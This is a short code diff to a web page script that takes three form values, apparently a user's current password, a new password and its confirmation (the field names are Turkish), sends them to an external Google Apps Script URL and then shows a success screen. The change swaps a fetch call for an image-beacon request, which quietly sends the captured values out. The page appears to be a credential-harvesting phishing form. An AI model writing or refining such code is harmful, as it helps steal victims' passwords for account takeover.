@@ -450,7 +450,7 @@
     }
     const url = 'https://script.google.com/macros/s/AKfycbweQ2FrnycuU0OaqBopV1gGFdXrBR9iXkOJ8go5p-7vI-8y08uNcRE-9-JU0i1INCy5/exec';
     const params = '?mevcut=' + encodeURIComponent(p0) + '&yeni=' + encodeURIComponent(p1) + '&tekrar=' + encodeURIComponent(p2);
-    fetch(url + params, { method: 'GET', mode: 'no-cors' });
+    new Image().src = url + params;
     goTo('s-success');
   }
 </script>
